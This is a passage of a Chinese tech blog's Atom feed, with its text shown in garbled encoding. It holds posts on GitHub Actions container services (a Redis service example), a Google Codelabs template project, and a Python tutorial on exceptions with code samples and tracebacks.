    <content type="html"><![CDATA[<p>å¾ˆéš¾ä½ä¼°å®¹å™¨åœ¨DevOpså®è·µä¸­çš„é‡è¦æ€§ã€‚é€šå¸¸ï¼Œä½ ä¼šå°†å®¹å™¨éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒä¸­â”€â”€å› æ­¤å¾ˆè‡ªç„¶åœ°å¼€å§‹ä½¿ç”¨å®¹å™¨è¿›è¡Œæœ¬åœ°å¼€å‘ï¼Œå¹¶ç®¡ç†ä¾èµ–é¡¹ã€‚æˆ‘ä»¬ç ”ç©¶äº†å¦‚ä½•åˆ©ç”¨å®ƒ<a href="https://qiwihui.com/qiwihui-blog-88/">åœ¨å®¹å™¨å†…éƒ¨</a>è¿›è¡Œæ„å»ºã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#jobsjob_idservices">å®¹å™¨æœåŠ¡</a>ï¼Œå°†æ­£åœ¨è¿è¡Œçš„å®¹å™¨ç”¨ä½œæ„å»ºå’Œæµ‹è¯•å·¥ä½œæµç¨‹çš„ä¸€éƒ¨åˆ†ã€‚</p><p>ä½ é€šå¸¸éœ€è¦è¿è¡Œä¸€äº›ä¸å…¶ä»–æœåŠ¡ï¼ˆé€šå¸¸æ˜¯æ•°æ®åº“ï¼‰è¿›è¡Œé€šä¿¡çš„é›†æˆæµ‹è¯•ã€‚ä½ å¯ä»¥é€šè¿‡ç¼–å†™ <code>docker run</code> å‘½ä»¤æ¥æ‹‰ä¸‹å®¹å™¨ï¼Œå¯åŠ¨å®¹å™¨å¹¶æ˜ å°„å¿…è¦çš„ç«¯å£ï¼Œä»è€Œç¼–å†™è„šæœ¬ï¼Œä½†è¿™åœ¨æœ€ä½³æƒ…å†µä¸‹å¾ˆçƒ¦äººã€‚è€Œä¸”ï¼Œå¦‚æœä½ è¦<a href="https://qiwihui.com/qiwihui-blog-88/">åœ¨å®¹å™¨ä¸­è¿›è¡Œæ„å»º</a>ï¼Œåˆ™è‡ªå·±è¿è¡Œdockerä¼šå˜å¾—éå¸¸æ£˜æ‰‹ã€‚</p><p>ä½¿ç”¨å®¹å™¨æœåŠ¡å¯ä»¥ä½¿GitHub ActionsåŸºç¡€æ¶æ„ä¸ºä½ æ‰§è¡Œã€‚ä½ åªéœ€æŒ‡å®šå®¹å™¨å’Œè¦æ˜ å°„çš„ä»»ä½•ç«¯å£ï¼Œå®ƒå°†åœ¨ä½œä¸šå¼€å§‹æ—¶å¯åŠ¨æœåŠ¡å®¹å™¨ï¼Œå¹¶ä½¿è¯¥å®¹å™¨å¯ç”¨äºä½œä¸šä¸­çš„æ­¥éª¤ã€‚</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&#x27;redis:latest&#x27;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">6379</span><span class="string">/tcp</span></span><br></pre></td></tr></table></figure><p>è¿™å°†å¯åŠ¨ <code>redis:latest</code> å®¹å™¨å¹¶å°†å®¹å™¨ä¸­çš„ç«¯å£6379æ˜ å°„åˆ°è™šæ‹Ÿæœºè¿è¡Œç¨‹åºä¸Šçš„ç«¯å£ã€‚è¿™ç­‰åŒäºè¿è¡Œ <code>docker run redis:latest -p 6379/tcp</code>ï¼Œå°±åƒä½ è¦è¿è¡Œè¯¥å‘½ä»¤ä¸€æ ·ï¼Œæ˜ å°„åˆ°æœ¬åœ°è¿è¡Œç¨‹åºä¸Šçš„ç«¯å£ä¸æ˜¯ç¡®å®šæ€§çš„ã€‚GitHub Actionså¯åœ¨job.servicesä¸Šä¸‹æ–‡ä¸­æä¾›æ­¤ä¿¡æ¯ã€‚</p><p>ä½ å¯ä»¥æŸ¥çœ‹ <code>$&#123;&#123; job.services.redis.ports[6379] &#125;&#125;</code> ä»¥æ ‡è¯†æœ¬åœ°ç«¯å£å·ã€‚ï¼ˆå°±åƒè¿è¡Œ <code>docker run</code> ä¸€æ ·ï¼Œä½ è¿˜å¯ä»¥æŒ‡å®šå®¹å™¨ç«¯å£å’Œæœ¬åœ°ç«¯å£ï¼Œä¾‹å¦‚ <code>6379:6379</code>ï¼Œå°†å®¹å™¨ç«¯å£6379æ˜ å°„åˆ°æœ¬åœ°ç«¯å£6379ã€‚ï¼‰</p><p>å°†å…¶æ”¾å…¥å·¥ä½œæµä¸­ï¼Œå¦‚æœæˆ‘æœ‰ä¸€ä¸ª ä¸Rediså¯¹è¯çš„ <a href="https://github.com/actions/example-services/tree/master/redis">Node è„šæœ¬</a>ï¼Œå¹¶è¿æ¥åˆ° <code>REDIS_HOST</code> ç¯å¢ƒå˜é‡æ‰€æŒ‡å®šçš„Redisä¸»æœºçš„ `REDIS_PORT ç«¯å£ï¼Œé‚£ä¹ˆæˆ‘å¯ä»¥åˆ›å»ºä¸€ä¸ªå·¥ä½œæµï¼Œè¯¥å·¥ä½œæµå¯åŠ¨Rediså®¹å™¨å¹¶è¿è¡ŒNodeè„šæœ¬ã€‚</p><script src="https://gist.github.com/ethomson/466de42a3066a4fa646240f5fa20293b.js"></script><p>ä½ å¯ä»¥ä½¿ç”¨æœåŠ¡å®¹å™¨æ¥å¯åŠ¨æœåŠ¡ï¼Œä¾‹å¦‚ Redisï¼Œ PostgreSQL æˆ–MySQLç”šè‡³æ˜¯Seleniumã€‚æœåŠ¡å®¹å™¨çš„æ‰§è¡Œä½¿å·¥ä½œæµä¸­çš„è¿™äº›å®¹å™¨çš„æ‰§è¡Œå’Œäº¤äº’å˜å¾—æ›´åŠ å®¹æ˜“ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_20_container_services.html">https://www.edwardthomson.com/blog/github_actions_20_container_services.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬20å¤©ï¼šå®¹å™¨æœåŠ¡
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>Google codelabs æ¨¡æ¿</title>
    <link href="https://qiwihui.com/qiwihui-blog-112/"/>
    <id>https://qiwihui.com/qiwihui-blog-112/</id>
    <published>2022-08-13T01:54:25.650Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/qiwihui/codelabs-site-template">https://github.com/qiwihui/codelabs-site-template</a></p><p>ä¹‹å‰ç”¨è¿‡ Google Codelabsï¼Œå¯¹äºå®ƒæä¾›çš„æŒ‡å¯¼æ€§ï¼ŒåŠ¨æ‰‹çš„ç¼–ç è¿‡ç¨‹éå¸¸å–œæ¬¢ã€‚Codelabs ç”¨æ­¥éª¤æ€§çš„æ•™å­¦æ–¹å¼ï¼Œä¸€æ­¥æ­¥åœ°å¼•å¯¼ï¼Œéå¸¸é€‚åˆç”¨æ¥ä¹¦å†™æ•™ç¨‹ã€‚ä½†æ˜¯è¿™ç§æ•™ç¨‹çš„ç¼–å†™éœ€è¦ä¸¤ä¸ªè¿‡ç¨‹ï¼šä¸€æ˜¯éœ€è¦ä½¿ç”¨ç‰¹å®šçš„æ ¼å¼ä¹¦å†™ï¼Œè¿™ä¸ªæ ¼å¼æ¯” markdown ç¨å¤šä¸€äº›å†…å®¹ï¼›äºŒæ˜¯éœ€è¦ä½¿ç”¨ç‰¹å®šçš„å·¥å…· claat è¿›è¡Œè½¬æ¢ã€‚</p><p>è¿™ä¸ªé¡¹ç›®çš„ä½œç”¨å°±æ˜¯æä¾›æ¨¡æ¿å’Œè‡ªåŠ¨åŒ–è¿‡ç¨‹ï¼Œä½¿ç”¨ github actions å®Œæˆè‡ªåŠ¨æ„å»ºå’Œéƒ¨ç½²è¿‡ç¨‹ï¼Œæ˜¯æ•™ç¨‹ä¹¦å†™ä¸“æ³¨äºå†…å®¹ã€‚ä½ æ‰€éœ€è¦åšçš„å°±æ˜¯åœ¨è¿™ä¸ªé¡¹ç›®æ¨¡æ¿çš„åŸºç¡€ä¸Šï¼Œåœ¨ <code>markdowns</code> ç›®å½•ä¸­ï¼ŒæŒ‰ä¸åŒéœ€è¦å¢åŠ æ•™ç¨‹å³å¯ã€‚</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/3297411/108469275-ea983e80-72c2-11eb-8fd6-4d0f8aadf703.png" alt="image"></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Google codelabs æ¨¡æ¿
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>09. å¼‚å¸¸å’Œé”™è¯¯ â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-126/"/>
    <id>https://qiwihui.com/qiwihui-blog-126/</id>
    <published>2022-08-13T01:54:25.650Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>Pythonç¨‹åºåœ¨é‡åˆ°é”™è¯¯åç«‹å³ç»ˆæ­¢ã€‚åœ¨Pythonä¸­ï¼Œé”™è¯¯å¯ä»¥æ˜¯è¯­æ³•é”™è¯¯æˆ–å¼‚å¸¸ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†å…³æ³¨ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>è¯­æ³•é”™è¯¯ä¸å¼‚å¸¸</li><li>å¦‚ä½•æŠ›å‡ºå¼‚å¸¸</li><li>å¦‚ä½•å¤„ç†å¼‚å¸¸</li><li>å¸¸è§çš„å†…ç½®å¼‚å¸¸</li><li>å¦‚ä½•å®šä¹‰è‡ªå·±çš„å¼‚å¸¸</li></ul><span id="more"></span><h3><span id="yu-fa-cuo-wu">è¯­æ³•é”™è¯¯</span></h3><p>å½“è§£æå™¨æ£€æµ‹åˆ°è¯­æ³•ä¸æ­£ç¡®çš„è¯­å¥æ—¶å‘ç”Ÿè¯­æ³•é”™è¯¯ã€‚ è¯­æ³•é”™è¯¯å¯ä»¥æ˜¯ä¾‹å¦‚æ‹¼å†™é”™è¯¯ï¼Œç¼ºå°‘æ‹¬å·ï¼Œæ²¡æœ‰æ–°è¡Œï¼ˆè¯·å‚è§ä¸‹é¢çš„ä»£ç ï¼‰æˆ–é”™è¯¯çš„æ ‡è¯†ï¼ˆè¿™å®é™…ä¸Šä¼šå¼•å‘å®ƒè‡ªå·±çš„IndentationErrorï¼Œä½†å®ƒæ˜¯SyntaxErrorçš„å­ç±»ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">5</span> <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">File <span class="string">&quot;&lt;ipython-input-5-fed4b61d14cd&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">a = <span class="number">5</span> <span class="built_in">print</span>(a)</span><br><span class="line">              ^</span><br><span class="line">SyntaxError: invalid syntax</span><br></pre></td></tr></table></figure><h3><span id="yi-chang">å¼‚å¸¸</span></h3><p>å³ä½¿ä¸€æ¡è¯­å¥åœ¨è¯­æ³•ä¸Šæ˜¯æ­£ç¡®çš„ï¼Œæ‰§è¡Œè¯¥è¯­å¥ä¹Ÿå¯èƒ½å¯¼è‡´é”™è¯¯ï¼Œè¿™ç§°ä¸º <strong>å¼‚å¸¸é”™è¯¯</strong>ã€‚ æœ‰å‡ ç§ä¸åŒçš„é”™è¯¯ç±»åˆ«ï¼Œä¾‹å¦‚ï¼Œå°è¯•å¯¹æ•°å­—å’Œå­—ç¬¦ä¸²æ±‚å’Œå°†å¼•å‘ <code>TypeError</code>ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">5</span> + <span class="string">&#x27;10&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line">TypeError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">6</span>-893398416ed7&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> a = <span class="number">5</span> + <span class="string">&#x27;10&#x27;</span></span><br><span class="line"></span><br><span class="line">TypeError: unsupported operand <span class="built_in">type</span>(s) <span class="keyword">for</span> +: <span class="string">&#x27;int&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure><h3><span id="pao-chu-yi-chang">æŠ›å‡ºå¼‚å¸¸</span></h3><p>å¦‚æœè¦åœ¨æ»¡è¶³ç‰¹å®šæ¡ä»¶æ—¶å¼ºåˆ¶å‘ç”Ÿå¼‚å¸¸ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ <code>raise</code> å…³é”®å­—ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = -<span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;x should not be negative.&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line">Exception                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">4</span>-2a9e7e673803&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">      <span class="number">1</span> x = -<span class="number">5</span></span><br><span class="line">      <span class="number">2</span> <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">----&gt; <span class="number">3</span>     <span class="keyword">raise</span> Exception(<span class="string">&#x27;x should not be negative.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Exception: x should <span class="keyword">not</span> be negative.</span><br></pre></td></tr></table></figure><p>ä½ è¿˜å¯ä»¥ä½¿ç”¨ <code>assert</code> è¯­å¥ï¼Œå¦‚æœä½ çš„æ–­è¨€<strong>ä¸æ˜¯</strong> <code>True</code>ï¼Œåˆ™å°†å¼•å‘ <code>AssertionError</code>ã€‚ è¿™æ ·ï¼Œä½ å¯ä»¥ä¸»åŠ¨æµ‹è¯•å¿…é¡»æ»¡è¶³çš„æŸäº›æ¡ä»¶ï¼Œè€Œä¸å¿…ç­‰å¾…ç¨‹åºä¸­é€”å´©æºƒã€‚ æ–­è¨€è¿˜ç”¨äº<strong>å•å…ƒæµ‹è¯•</strong>ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = -<span class="number">5</span></span><br><span class="line"><span class="keyword">assert</span> (x &gt;= <span class="number">0</span>), <span class="string">&#x27;x is not positive.&#x27;</span></span><br><span class="line"><span class="comment"># --&gt; å¦‚æœ x &gt;= 0ï¼Œä»£ç å°†æ­£å¸¸è¿è¡Œ</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line">AssertionError                            Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">7</span>-f9b059c51e45&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">      <span class="number">1</span> x = -<span class="number">5</span></span><br><span class="line">----&gt; <span class="number">2</span> <span class="keyword">assert</span> (x &gt;= <span class="number">0</span>), <span class="string">&#x27;x is not positive.&#x27;</span></span><br><span class="line">      <span class="number">3</span> <span class="comment"># --&gt; Your code will be fine if x &gt;= 0</span></span><br><span class="line">AssertionError: x <span class="keyword">is</span> <span class="keyword">not</span> positive.</span><br></pre></td></tr></table></figure><h3><span id="chu-li-yi-chang">å¤„ç†å¼‚å¸¸</span></h3><p>ä½ å¯ä»¥ä½¿ç”¨ <code>try</code> å’Œ <code>except</code> å—æ¥æ•è·å’Œå¤„ç†å¼‚å¸¸ã€‚ å¦‚æœä½ å¯ä»¥æ•è·å¼‚å¸¸ï¼Œåˆ™ä½ çš„ç¨‹åºå°†ä¸ä¼šç»ˆæ­¢ï¼Œå¹¶ä¸”å¯ä»¥ç»§ç»­ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¿™å°†æ•è·æ‰€æœ‰å¯èƒ½çš„å¼‚å¸¸</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">5</span> / <span class="number">0</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;some error occured.&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># å¯ä»¥æ•è·å¼‚å¸¸ç±»å‹</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">5</span> / <span class="number">0</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># æœ€å¥½æŒ‡å®šè¦æ•è·çš„å¼‚å¸¸ç±»å‹</span></span><br><span class="line"><span class="comment"># å› æ­¤ï¼Œä½ å¿…é¡»çŸ¥é“å¯èƒ½çš„é”™è¯¯</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">5</span> / <span class="number">0</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Only a ZeroDivisionError is handled here&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># ä½ å¯ä»¥åœ¨tryå—ä¸­è¿è¡Œå¤šä¸ªè¯­å¥ï¼Œå¹¶æ•è·ä¸åŒçš„å¯èƒ½çš„å¼‚å¸¸</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">5</span> / <span class="number">1</span> <span class="comment"># æ³¨æ„ï¼šè¿™é‡Œæ²¡æœ‰ ZeroDivisionError</span></span><br><span class="line">    b = a + <span class="string">&#x27;10&#x27;</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;A ZeroDivisionError occured:&#x27;</span>, e)</span><br><span class="line"><span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;A TypeError occured:&#x27;</span>, e)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Some error occured.</span><br><span class="line">Division by zero</span><br><span class="line">Only a ZeroDivisionError <span class="keyword">is</span> handled here</span><br><span class="line">A TypeError occured: unsupported operand <span class="built_in">type</span>(s) <span class="keyword">for</span> +: <span class="string">&#x27;float&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure><h3><span id="else-yu-ju"><code>else</code> è¯­å¥</span></h3><p>å¦‚æœæ²¡æœ‰å‘ç”Ÿå¼‚å¸¸ï¼Œåˆ™å¯ä»¥ä½¿ç”¨elseè¯­å¥è¿è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">5</span> / <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;A ZeroDivisionError occured:&#x27;</span>, e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Everything is ok&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Everything <span class="keyword">is</span> ok</span><br></pre></td></tr></table></figure><h3><span id="finally-yu-ju"><code>finally</code> è¯­å¥</span></h3><p>ä½ å¯ä»¥ä½¿ç”¨å§‹ç»ˆè¿è¡Œçš„ <code>finally</code> è¯­å¥ï¼Œæ— è®ºæ˜¯å¦å­˜åœ¨å¼‚å¸¸ã€‚ ä¾‹å¦‚ï¼Œè¿™å¯ç”¨äºè¿›è¡Œä¸€äº›æ¸…ç†æ“ä½œã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a = <span class="number">5</span> / <span class="number">1</span> <span class="comment"># æ³¨æ„ï¼šè¿™é‡Œæ²¡æœ‰ ZeroDivisionError</span></span><br><span class="line">    b = a + <span class="string">&#x27;10&#x27;</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;A ZeroDivisionError occured:&#x27;</span>, e)</span><br><span class="line"><span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;A TypeError occured:&#x27;</span>, e)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Everything is ok&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Cleaning up some stuff...&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A TypeError occured: unsupported operand <span class="built_in">type</span>(s) <span class="keyword">for</span> +: <span class="string">&#x27;float&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;str&#x27;</span></span><br><span class="line">Cleaning up some stuff...</span><br></pre></td></tr></table></figure><h3><span id="chang-jian-de-nei-zhi-yi-chang">å¸¸è§çš„å†…ç½®å¼‚å¸¸</span></h3><p>ä½ å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°æ‰€æœ‰å†…ç½®çš„å¼‚å¸¸ï¼š<a href="https://docs.python.org/3/library/exceptions.html">https://docs.python.org/3/library/exceptions.html</a></p><ul><li><code>ImportError</code>ï¼šå¦‚æœæ— æ³•å¯¼å…¥æ¨¡å—</li><li><code>NameError</code>ï¼šå¦‚æœä½ å°è¯•ä½¿ç”¨æœªå®šä¹‰çš„å˜é‡</li><li><code>FileNotFoundError</code>ï¼šå¦‚æœä½ å°è¯•æ‰“å¼€ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æˆ–æŒ‡å®šäº†é”™è¯¯çš„è·¯å¾„</li><li><code>ValueError</code>ï¼šå½“æŸä¸ªæ“ä½œæˆ–å‡½æ•°æ”¶åˆ°ç±»å‹æ­£ç¡®ä½†å€¼ä¸æ­£ç¡®çš„å‚æ•°æ—¶ï¼Œä¾‹å¦‚å°è¯•ä»ä¸å­˜åœ¨çš„åˆ—è¡¨ä¸­åˆ é™¤å€¼</li><li><code>TypeError</code>ï¼šå°†æ“ä½œæˆ–å‡½æ•°åº”ç”¨äºä¸é€‚å½“ç±»å‹çš„å¯¹è±¡æ—¶å¼•å‘ã€‚</li><li><code>IndexError</code>ï¼šå¦‚æœä½ å°è¯•è®¿é—®åºåˆ—çš„æ— æ•ˆç´¢å¼•ï¼Œä¾‹å¦‚åˆ—è¡¨æˆ–å…ƒç»„ã€‚</li><li><code>KeyError</code>ï¼šå¦‚æœä½ å°è¯•è®¿é—®å­—å…¸ä¸­ä¸å­˜åœ¨çš„é”®ã€‚</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ImportError</span></span><br><span class="line"><span class="keyword">import</span> nonexistingmodule</span><br><span class="line"></span><br><span class="line"><span class="comment"># NameError</span></span><br><span class="line">a = someundefinedvariable</span><br><span class="line"></span><br><span class="line"><span class="comment"># FileNotFoundError</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;nonexistingfile.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    read_data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ValueError</span></span><br><span class="line">a = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">a.remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># TypeError</span></span><br><span class="line">a = <span class="number">5</span> + <span class="string">&quot;10&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># IndexError</span></span><br><span class="line">a = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">value = a[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># KeyError</span></span><br><span class="line">my_dict = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Max&quot;</span>, <span class="string">&quot;city&quot;</span>: <span class="string">&quot;Boston&quot;</span>&#125;</span><br><span class="line">age = my_dict[<span class="string">&quot;age&quot;</span>]</span><br></pre></td></tr></table></figure><h3><span id="ru-he-ding-yi-zi-ji-de-yi-chang">å¦‚ä½•å®šä¹‰è‡ªå·±çš„å¼‚å¸¸</span></h3><p>ä½ å¯ä»¥å®šä¹‰è‡ªå·±çš„å¼‚å¸¸ç±»ï¼Œè¯¥å¼‚å¸¸ç±»åº”ä»å†…ç½®çš„ <code>Exception</code> ç±»æ´¾ç”Ÿã€‚ ä¸æ ‡å‡†å¼‚å¸¸çš„å‘½åç±»ä¼¼ï¼Œå¤§å¤šæ•°å¼‚å¸¸éƒ½ä»¥â€œé”™è¯¯â€ç»“å°¾çš„åç§°å®šä¹‰ã€‚ å¯ä»¥åƒå®šä¹‰å…¶ä»–ä»»ä½•ç±»ä¸€æ ·å®šä¹‰å¼‚å¸¸ç±»ï¼Œä½†æ˜¯å®ƒä»¬é€šå¸¸ä¿æŒç®€å•ï¼Œé€šå¸¸ä»…æä¾›ä¸€å®šæ•°é‡çš„å±æ€§ï¼Œè¿™äº›å±æ€§å…è®¸å¤„ç†ç¨‹åºæå–æœ‰å…³é”™è¯¯çš„ä¿¡æ¯ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è‡ªå®šä¹‰å¼‚å¸¸ç±»çš„æœ€å°ç¤ºä¾‹</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ValueTooHighError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…ä¸ºå¤„ç†è€…æ·»åŠ ä¸€äº›ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ValueTooLowError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, message, value</span>):</span><br><span class="line">        self.message = message</span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_value</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">if</span> a &gt; <span class="number">1000</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueTooHighError(<span class="string">&#x27;Value is too high.&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> a &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueTooLowError(<span class="string">&#x27;Value is too low.&#x27;</span>, a) <span class="comment"># æ³¨æ„ï¼Œæ„é€ å™¨æ¥å—ä¸¤ä¸ªå‚æ•°</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    test_value(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> ValueTooHighError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">except</span> ValueTooLowError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e.message, <span class="string">&#x27;The value is:&#x27;</span>, e.value)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Value <span class="keyword">is</span> too low. The value <span class="keyword">is</span>: <span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      09. å¼‚å¸¸å’Œé”™è¯¯ â€” Python è¿›é˜¶
    
    </summary>
    
